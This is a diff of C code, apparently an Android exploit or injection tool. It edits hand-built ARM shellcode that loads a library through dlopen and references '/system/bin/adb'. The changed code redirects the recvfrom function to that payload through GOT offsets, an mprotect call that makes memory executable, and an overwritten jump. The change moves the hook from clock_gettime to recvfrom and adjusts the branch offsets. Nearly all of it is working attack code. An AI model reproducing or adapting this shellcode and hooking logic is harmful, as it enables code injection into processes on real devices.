@@ -362,7 +362,7 @@ int main(int argc, char *argv[])
 				"\x0a\x00\x00\xea"
 				//dlopen
 				"\x0f\x00\xa0\xe1"
-				"\x44\x00\x80\xe2"
+				"\x4c\x00\x80\xe2"
 				"\x00\x10\xa0\xe3"
 				"\x03\x30\x43\xe0"
 				"\x0f\x30\x83\xe0"
@@ -373,18 +373,17 @@ int main(int argc, char *argv[])
 				"\x33\xff\x2f\xe1"
 				"\xff\x40\xbd\xe8"
 				//org_fun
-				"\x07\xc0\xa0\xe1"
-				"\x30\x70\x9f\xe5"
+				"\x0d\xc0\xa0\xe1"
+				"\xf0\x00\x2d\xe9"
+				"\x70\x00\x9c\xe8"
+				"\x49\x7f\xa0\xe3"
 				"\x00\x00\x00\xef"
-				"\x0c\x70\xa0\xe1"
+				"\xf0\x00\xbd\xe8"
 				"\x01\x0a\x70\xe3"
 				"\x1e\xff\x2f\x91"
 				"\x00\x00\x60\xe2"
 				"\x00\x00\x00\xea"
-                "\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x61\x64\x62\x00\x00\x00\x00\x00"
-                "\x00\x00\x00\x00"
-                "\x00\x00\x00\x00"
-                "\x07\x01\x00\x00";
+                "\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x61\x64\x62\x00\x00\x00\x00\x00";
  
 	//sleep(30);
 	
@@ -410,7 +409,7 @@ int main(int argc, char *argv[])
 
 	int dlopen_offset = got_addr_off + i * 4;
 	char* vaddr_dlopen_got = start + dlopen_offset;
-	char* vaddr_recvfrom   = get_func_addr("clock_gettime");
+	char* vaddr_recvfrom   = get_func_addr("recvfrom");
 	int   vaddr_payload = (void*)(end - 0x90);
 
 	//get addr of set_errno
@@ -428,10 +427,10 @@ int main(int argc, char *argv[])
 
 
     dlopen_offset = vaddr_dlopen_got - vaddr_payload - 0x48 ;
-    set_errno_offset = vaddr_set_errno - (vaddr_payload + 0x6c + 8);//8074:	eafffff5 	b	8050 <org_fun>
+    set_errno_offset = vaddr_set_errno - (vaddr_payload + 0x74 + 8);//8074:	eafffff5 	b	8050 <org_fun>
 
-    *(int*)&SC[0x6c] = set_errno_offset/4;//8074:	eafffff5 	b	8050 <org_fun>
-    *(char*)&SC[0x6f] = 0xea;//8074:	eafffff5 	b	8050 <org_fun>
+    *(int*)&SC[0x74] = set_errno_offset/4;//8074:	eafffff5 	b	8050 <org_fun>
+    *(char*)&SC[0x77] = 0xea;//8074:	eafffff5 	b	8050 <org_fun>
     *(int*)&SC[0x88] = dlopen_offset;
     printf("dlopen_offset = %08lx", dlopen_offset);
     patch(vaddr_payload, SC, 0x90);
@@ -448,7 +447,7 @@ int main(int argc, char *argv[])
   	addr = (void *)((int)vaddr_recvfrom & (~(PAGE_SIZE - 1)));
     mprotect (addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
  	memcpy(vaddr_recvfrom, JMP, 16);
-	printf("getuid() = %d\n", clock_gettime(0,0));
+	printf("getuid() = %d\n", recvfrom(0,0,0,0,0,0));
 
 
 	exit(0);
